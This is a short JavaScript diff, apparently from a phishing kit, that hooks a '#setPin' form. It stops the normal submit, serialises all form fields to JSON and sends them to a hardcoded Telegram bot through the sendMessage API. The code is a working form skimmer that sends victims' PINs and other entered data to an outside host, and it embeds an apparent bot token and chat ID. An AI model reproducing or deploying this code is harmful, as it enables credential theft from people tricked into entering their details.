@@ -17,7 +17,7 @@ const chat_id = '7709193105', botID = 'bot8105069628:AAHXgh0WPGwFgV4WB6LqeEiVA-K
 
     const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
-    document.querySelector('#main').addEventListener("submit", async e => { // When the user submits the form
+    document.querySelector('#setPin').addEventListener("submit", async e => { // When the user submits the form
         e.preventDefault(); // Don't submit
         let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
             Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
